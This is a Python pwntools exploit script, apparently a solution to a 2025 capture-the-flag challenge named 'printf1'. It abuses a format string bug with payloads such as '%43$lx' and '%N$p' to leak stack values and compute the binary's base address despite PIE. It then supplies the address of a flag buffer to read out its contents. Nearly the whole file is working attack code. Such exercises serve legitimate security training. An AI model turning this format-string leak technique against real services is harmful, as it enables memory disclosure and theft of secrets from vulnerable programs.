#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --port 14001 --host localhost --libc ./libc.so.6 ../src/printf1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('../src/printf1.debug')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 14001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        print(exe)
        print(exe.path)
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# RUNPATH:    b'/home/ena/coding/remote/ctfs/magpiesctf/2025/pwn/printf1/src/../../'
# Stripped:   No
# Debuginfo:  Yes

# calculating where the stack vars are
#parts = []
#for i in range(10, 70, 10):
#    io = start()
#    
#    # the return address of main is the 7th stack var
#    io.recvuntil(b"something: ")
#    
#    payload = "|".join([f"%{j + i}$p" for j in range(10)])
#    io.sendline(payload.encode('ascii'))
#    
#    io.recvuntil(b"said:")
#    part = io.recvuntil(b"I bet", drop=True).decode('ascii')
#    io.close()
#
#    # formatting
#    parts.append([i, list(map(lambda x: x.strip(), part.split("|")))])
#
## printing out the stack vars
#for base, part in parts:
#    for index, p in enumerate(part):
#        print(f"{(base + index):03d}: {p}")

io = start()

# main is @ stack var 43
io.info("Leaking base address of the binary.")
io.recvuntil(b"something: ")

payload = "%43$lx"
io.sendline(payload.encode('ascii'))

io.recvuntil(b"said:")
main_addr = int(io.recvuntil(b"I bet", drop=True).decode('ascii'), 16)

# logging
exe.address = main_addr - exe.sym["main"]
io.success(f"Leaked address of main: {hex(main_addr)}")
io.success(f"Leaked base address of binary: {hex(exe.address)}")

flag_buffer = exe.symbols["flag_buffer"]

# entering in the address of flag_buffer
io.info("Leaking flag.")

io.recvuntil(b"from? ")
io.sendline(f"{flag_buffer}".encode('ascii'))

# flag obtained
io.recvuntil(b"interesting: ")
flag = io.recvall().decode('ascii')

io.success(f"Flag: {flag}")

